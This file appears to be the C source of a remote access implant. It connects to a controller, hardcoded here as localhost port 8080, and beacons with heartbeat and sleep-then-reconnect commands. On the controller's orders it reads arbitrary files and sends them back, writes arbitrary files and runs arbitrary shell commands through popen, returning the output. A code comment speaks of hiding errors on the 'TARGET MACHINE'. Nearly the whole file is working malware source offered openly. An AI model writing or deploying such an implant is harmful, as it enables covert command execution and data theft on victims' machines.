#define _POSIX_C_SOURCE 200809L
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>
#include "protocol.h"
#include <stdlib.h>

int connect_to_controller()
{

    int implant_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (implant_fd < 1)
    {
        perror("socket"); // fix this, we do not want to print an error on the TARGET MACHINE
        return -1;
    }

    struct sockaddr_in controller_ip_structure;

    memset(&controller_ip_structure, 0, sizeof(controller_ip_structure));
    controller_ip_structure.sin_family = AF_INET;
    controller_ip_structure.sin_port = htons(8080);

    const char *CONTROLLER_IP_ADDR = "127.0.0.1";

    if (inet_pton(AF_INET, CONTROLLER_IP_ADDR, &controller_ip_structure.sin_addr) <= 0)
    {

        perror("inet_pton:");
        close(implant_fd);
        return -1;
    }

    if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
    {
        perror("send:");
        close(implant_fd);
        return -1;
    }

    printf("<Succesfully connected to Controller!\n");

    printf("<Sending initial HELLO......>\n");

    Packet initial_hello = {COMMAND_HELLO, 0, 0, NULL};

    if (send_packet(&initial_hello, implant_fd) == 0)
    {

        // sending the client hello did not work close the implant
        printf("ERROR!");
        close(implant_fd);
        return -1;
    }

    return implant_fd; // returned the socket file descriptor
}

int main(int argc, char **argv)
{

    int implant_fd = connect_to_controller();

    if (implant_fd == -1)
    {

        return 1;
    }

    // if we got here then the client hello was sent and we start our loop

    int shutdown = 0;

    while (!shutdown)
    {

        Packet *recieved_packet = recieve_packet(implant_fd);

        if (recieved_packet == NULL)
        {

            close(implant_fd);
            return 1;
        }

        switch (recieved_packet->command_type)
        {
        case COMMAND_HEARTBEAT:
        {
            char *payload = "ALIVE";
            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
            send_packet(&response, implant_fd);

            break;
        }
        case COMMAND_SET_SLEEP:
        {

            // need to sleep, close sockt connection then reconnect after the set sleep in seconds in the payload
            int sleep_duration = *(int *)recieved_packet->payload;

            char buffer[100];
            snprintf(buffer, sizeof(buffer), "Sleeping for %d seconds......", sleep_duration);

            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(buffer), buffer};
            send_packet(&response, implant_fd);
            close(implant_fd);
            sleep(sleep_duration); // sleep for that duration
            printf("Returned from sleeping for %d seconds \n", sleep_duration);
            implant_fd = connect_to_controller();

            if (implant_fd == -1)
            {
                return 1; // error
            }

                        break;
        }

        case COMMAND_SHUTDOWN:
        {
            char *payload = "SUCCESFULLY SHUTDOWN";
            Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, strlen(payload), payload};
            send_packet(&response, implant_fd);
            shutdown = 1;

            break;
        }
        case COMMAND_READ_DATA:
        {

            char path[recieved_packet->payload_len + 1];
            memcpy(path, recieved_packet->payload, recieved_packet->payload_len);
            path[recieved_packet->payload_len] = '\0'; // append the null terminator to the string

            FILE *fp = fopen(path, "r");

            if (fp == NULL)
            {

                char *error_msg = "file not found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                char output[4096];
                int bytes_read = fread(output, 1, sizeof(output), fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, bytes_read, output};
                send_packet(&response, implant_fd);
                fclose(fp);
            }

            break;
        }
        case COMMAND_WRITE_DATA:

        {

            // Payload format for write data: [path_len (4 bytes)][file path][file contents...]
            char *payload = recieved_packet->payload;

            int path_len = (*(int *)payload);

            char path[path_len + 1];

            memcpy(path, payload + 4, path_len);
            path[path_len] = '\0';

            char *contents = payload + 4 + path_len;
            int content_length = recieved_packet->payload_len - 4 - path_len;

            FILE *fp = fopen(path, "w");

            if (fp == NULL)
            {

                char *error_msg = "file not created/found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                fwrite(contents, 1, content_length, fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, 0, NULL};
                send_packet(&response, implant_fd);
                fclose(fp);
            }

            break;
        }
        case COMMAND_RUN_CMD:
        {

            char cmd[recieved_packet->payload_len + 1];
            memcpy(cmd, recieved_packet->payload, recieved_packet->payload_len);
            cmd[recieved_packet->payload_len] = '\0'; // append the null terminator to the string

            FILE *fp = popen(cmd, "r"); // call the command

            if (fp == NULL)
            {

                char *error_msg = "file not found";
                Packet error = {
                    COMMAND_ERROR,
                    recieved_packet->request_id,
                    strlen(error_msg),
                    error_msg};
                send_packet(&error, implant_fd);
            }
            else
            {

                char output[4096];
                int bytes_read = fread(output, 1, sizeof(output), fp);

                Packet response = {COMMAND_RESPONSE, recieved_packet->request_id, bytes_read, output};
                send_packet(&response, implant_fd);
                pclose(fp);
            }

            break;
        }
        default:
            break;
        }
    }

    close(implant_fd); // close the implant file descriptors on close

    return 0;
}